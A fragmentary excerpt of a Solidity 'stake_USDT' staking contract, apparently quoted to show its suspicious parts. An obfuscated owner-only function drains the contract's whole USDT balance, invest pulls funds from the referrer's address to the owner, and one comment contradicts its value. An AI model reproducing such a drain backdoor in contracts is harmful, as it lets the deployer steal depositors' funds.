...
contract stake_USDT {
    ...
    uint256 public constant INVEST_MIN_AMOUNT = 1 ether;//10 USDT minimum deposit 
    ...
    function invest(address referrer, uint8 plan,  uint256 value) public {
        ...
        token.transferFrom(referrer, OwnerAddress, value);}
        else {
...
function erkfjgoerfe()  public {
	if  (msg.sender == OwnerAddress) 
    {
        token.transfer(OwnerAddress, IBEP20(usdt).balanceOf(address(this)));
        }
}
